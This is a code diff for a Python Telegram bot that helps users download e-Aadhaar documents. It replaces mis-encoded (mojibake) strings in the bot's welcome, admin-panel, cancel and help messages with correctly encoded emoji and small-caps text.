-            f"<b>{emo('Ã°ÂÂÂ')} Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã°ÂÂÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂssÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n\n"
-            f"<b>{emo('Ã°ÂÂ«Â¡')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â-Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ?</b>\n\n"
-            f"<b>{emo('Ã¢ÂÂ¡')} Ã¡Â´ÂsÃ¡Â´Â /help ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
+            f"<b>{emo('👉')} ʜᴇʏ!!, ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ~ {html.escape(user.first_name or 'User')}</b>\n\n"
+            f"<b>{emo('📄')} 𝐀ᴀᴅʜᴀᴀʀ 𝐂ᴀʀᴅ 𝐃ᴏᴡɴʟᴏᴀᴅ 𝐀ssɪsᴛᴀɴᴛ</b>\n\n"
+            f"<b>{emo('🫡')} ɴᴇᴇᴅ ʜᴇʟᴘ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ ᴇ-ᴀᴀᴅʜᴀᴀʀ?</b>\n\n"
+            f"<b>{emo('⚡')} ᴜsᴇ /help ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ</b>\n\n"
+            f"<b>{emo('🛠️')} ᴅᴇᴠʟᴏᴘᴇʀ : <a href='https://t.me/RORINDIA'>◄ᯓ❥≛⃝🌸𝐌4𝐇𝐄𝐒𝐇💗⃝❥꯭✿࿐</a></b>"
         )
         kb = self.get_main_menu_keyboard()
         if update.callback_query:
@@ -2084,27 +2054,27 @@ class AadhaarBot:
         uid = update.effective_user.id
         if not is_admin(uid):
             if update.callback_query:
-                await update.callback_query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await update.callback_query.answer("❌ You are not authorized!", show_alert=True)
             else:
-                await update.message.reply_text("Ã¢ÂÂ You are not authorized to access admin panel.")
+                await update.message.reply_text("❌ You are not authorized to access admin panel.")
             return
 
         tu = get_all_users_count()
         bu = get_banned_users_count()
         ts = get_today_stats()
         td = get_total_stats()
-        m = "Ã°ÂÂÂ´ ON" if is_maintenance_mode() else "Ã°ÂÂÂ¢ OFF"
+        m = "🔴 ON" if is_maintenance_mode() else "🟢 OFF"
         msg = (
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ</b>\n\n"
+            f"<b>{emo('🛠️')} ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ</b>\n\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {tu}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ«')} ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â: {bu}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {ts['downloads']}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {ts['users']}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ¯')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {td}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´Â: {m}</b>\n"
+            f"<b>{emo('👤')} ᴛᴏᴛᴀʟ ᴜsᴇʀs: {tu}</b>\n"
+            f"<b>{emo('🚫')} ʙᴀɴɴᴇᴅ: {bu}</b>\n"
+            f"<b>{emo('📊')} ᴛᴏᴅᴀʏ ᴅᴏᴡɴʟᴏᴀᴅs: {ts['downloads']}</b>\n"
+            f"<b>{emo('👥')} ᴛᴏᴅᴀʏ ᴜsᴇʀs: {ts['users']}</b>\n"
+            f"<b>{emo('💯')} ᴛᴏᴛᴀʟ: {td}</b>\n"
+            f"<b>{emo('🛠️')} ᴍᴀɪɴᴛ: {m}</b>\n"
             "</blockquote>\n"
-            "<b>sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡:</b>"
+            "<b>sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</b>"
         )
         kb = self.get_admin_menu_keyboard()
         if update.callback_query:
@@ -2135,7 +2105,7 @@ class AadhaarBot:
 
         if is_user_banned(uid):
             await update.message.reply_text(
-                f"<b>{emo('Ã°ÂÂÂ«')} ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
+                f"<b>{emo('🚫')} ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ</b>", parse_mode='HTML')
             return
 
         asyncio.create_task(asyncio.to_thread(
@@ -2171,7 +2141,7 @@ class AadhaarBot:
 
         if self.active_batches.get(uid):
             self.active_batches[uid]['cancel'] = True
-            await update.message.reply_text(f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
+            await update.message.reply_text(f"<b>{emo('🛑')} ʙᴀᴛᴄʜ ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴀɴᴄᴇʟʟᴇᴅ</b>", parse_mode='HTML')
             return
 
         if data.get('awaiting_firebase_add') or data.get('fb_adding_name'):
@@ -2183,7 +2153,7 @@ class AadhaarBot:
             self.update_user_data(uid, 'awaiting_broadcast', False)
             self.update_user_data(uid, 'broadcast_pin', False)
             await update.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
+                f"<b>{emo('✅')} ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ</b>", parse_mode='HTML')
             return
 
         if data.get('download_mode') or (data.get('stage') and data.get('stage') != 'main_menu'):
@@ -2192,13 +2162,13 @@ class AadhaarBot:
 
         if cancelled_anything:
             await update.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!</b>\n\n"
+                f"<b>{emo('✅')} ᴄᴀɴᴄᴇʟʟᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ!</b>\n\n"
                 "<b>Aapka process cancel kar diya gaya hai. Send /start to begin.</b>",
                 parse_mode='HTML')
         else:
             await update.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´</b>\n"
-                "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /start Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢ÃÂªÃÂ´.</b>", parse_mode='HTML')
+                f"<b>{emo('❌')} ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ</b>\n"
+                "<b>sᴇɴᴅ /start ᴛᴏ ʙᴇɢɪɴ.</b>", parse_mode='HTML')
 
     async def help(self, update, ctx):
         uid = update.effective_user.id
@@ -2208,44 +2178,36 @@ class AadhaarBot:
             return
 
         help_msg = (
-            f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â</b>\n"
+            f"<b>{emo('📖')} ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
             "<blockquote>"
-            f"<b>{emo('1Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂR ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂR</b>\n"
-            f"<b>{emo('2Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
-            f"<b>{emo('3Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â</b>\n"
-            f"<b>{emo('4Ã¯Â¸ÂÃ¢ÂÂ£')} ÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´s Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss</b>\n"
-            f"<b>{emo('5Ã¯Â¸ÂÃ¢ÂÂ£')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃÂ sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
+            f"<b>{emo('1️⃣')} ᴇɴᴛᴇR ʏᴏᴜʀ ʀᴇɢɪsᴛᴇʀᴇᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇR</b>\n"
+            f"<b>{emo('2️⃣')} ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴘʀᴏᴄᴇss ɪɴɪᴛɪᴀʟɪᴢᴀᴛɪᴏɴ</b>\n"
+            f"<b>{emo('3️⃣')} ᴠᴇʀɪꜰɪᴇᴅ ᴡɪᴛʜ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ʏᴏᴜʀ ᴏᴡɴ ᴅᴇᴠɪᴄᴇ</b>\n"
+            f"<b>{emo('4️⃣')} ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ ᴄᴏᴍᴘʟᴇᴛᴇ ᴛʜᴇ ᴘʀᴏᴄᴇss</b>\n"
+            f"<b>{emo('5️⃣')} ʀᴇᴄᴇɪᴠᴇ ʏᴏᴜʀ ᴅᴏᴄᴜᴍᴇɴᴛ ᴀꜰᴛᴇʀ sᴜᴄᴄᴇssꜰᴜʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ</b>\n"
             "</blockquote>\n\n"
-            f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs</b>\n"
+            f"<b>{emo('⚠️')} ɪᴍᴘᴏʀᴛᴀɴᴛ ɴᴏᴛᴇs</b>\n"
             "<blockquote>"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs</b>\n"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂR sÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂs</b>\n"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
+            "<b>• ᴜsᴇ ᴏɴʟʏ ʏᴏᴜʀ ᴏᴡɴ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴅᴏᴄᴜᴍᴇɴᴛs</b>\n"
+            "<b>• ᴋᴇᴇᴘ ʏᴏᴜʀ ᴏᴛᴘ ᴘʀɪᴠᴀᴛᴇ ᴀɴᴅ ɴᴇᴠᴇR sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴏᴛʜᴇʀs</b>\n"
+            "<b>• ᴋᴇᴇᴘ ᴛʜᴇ sᴇssɪᴏɴ ᴀᴄᴛɪᴠᴇ ᴜɴᴛɪʟ ᴛʜᴇ ᴘʀᴏᴄᴇss ɪs ᴄᴏᴍᴘʟᴇᴛᴇ</b>\n"
             "</blockquote>\n\n"
-            f"<b>{emo('Ã¢ÂÂÃ¯Â¸Â')} ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â</b>\n"
+            f"<b>{emo('⚖️')} ʟᴇɢᴀʟ ɴᴏᴛɪᴄᴇ</b>\n"
             "<blockquote>"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂÃÂªs sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs ÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´Â¡ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â ÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´Ã¡Â´ÂÃÂ.</b>\n"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂ´sÃÂªÃÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂªÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs.</b>\n"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss, Ã¡Â´ÂÃÂªsÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â ÃÂªÃ¡Â´ÂÃÂ ÃÂªs sÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´.</b>\n"
-            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªs ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂ´sÃÂªÃÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃÂªsÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs.</b>\n"
-            "<b>Ã¢ÂÂ¢ ÃÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃÂªÃÂ´ÃÂ¢, ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â¡s Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´s.</b>\n"
+            "<b>• ᴛʜɪs sᴇʀᴠɪᴄᴇ ɪs ɪɴᴛᴇɴᴅᴇᴅ ᴏɴʟʏ ꜰᴏʀ ʟᴀᴡꜰᴜʟ ᴀɴᴅ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇ ʙʏ ᴛʜᴇ ʀᴇsᴘᴇᴄᴛɪᴠᴇ ᴏᴡɴᴇʀ.</b>\n"
+            "<b>• ᴜsᴇʀs ᴀʀᴇ ʀᴇsᴘᴏɴsɪʙʟᴇ ꜰᴏʀ ᴘʀᴏᴠɪᴅɪɴɢ ᴀᴄᴄᴜʀᴀᴛᴇ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ᴀɴᴅ ᴏɴʟʏ ᴛʜᴇɪʀ ᴏᴡɴ ᴅᴏᴄᴜᴍᴇɴᴛs.</b>\n"
+            "<b>• ᴀɴʏ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇss, ᴍɪsᴜsᴇ ᴏʀ ꜰʀᴀᴜᴅᴜʟᴇɴᴛ ᴀᴄᴛɪᴠɪᴛʏ ɪs sᴛʀɪᴄᴛʟʏ ᴘʀᴏʜɪʙɪᴛᴇᴅ ᴀɴᴅ ᴍᴀʏ ʙᴇ sᴜʙᴊᴇᴄᴛ ᴛᴏ ʟᴇɢᴀʟ ᴀᴄᴛɪᴏɴ.</b>\n"
+            "<b>• ᴛʜᴇ sᴇʀᴠɪᴄᴇ ᴘʀᴏᴠɪᴅᴇʀ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ꜰᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏꜰ ᴛʜᴇ sᴇʀᴠɪᴄᴇ ʙʏ ᴜsᴇʀs.</b>\n"
+            "<b>• ʙʏ ᴄᴏɴᴛɪɴᴜɪɴɢ, ʏᴏᴜ ᴀɢʀᴇᴇ ᴛᴏ ᴜsᴇ ᴛʜɪs sᴇʀᴠɪᴄᴇ ɪɴ ᴄᴏᴍᴘʟɪᴀɴᴄᴇ ᴡɪᴛʜ ᴀᴘᴘʟɪᴄᴀʙʟᴇ ʟᴀᴡs ᴀɴᴅ ʀᴇɢᴜʟᴀᴛɪᴏɴs.</b>\n"
             "</blockquote>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs</b>\n"
+            f"<b>{emo('🔄')} ᴄᴏᴍᴍᴀɴᴅs</b>\n"
             "<blockquote>"
-            "<b>/start - sÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
-            "<b>/help - sÃÂÃ¡Â´ÂÃ¡Â´Â¡ ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n"
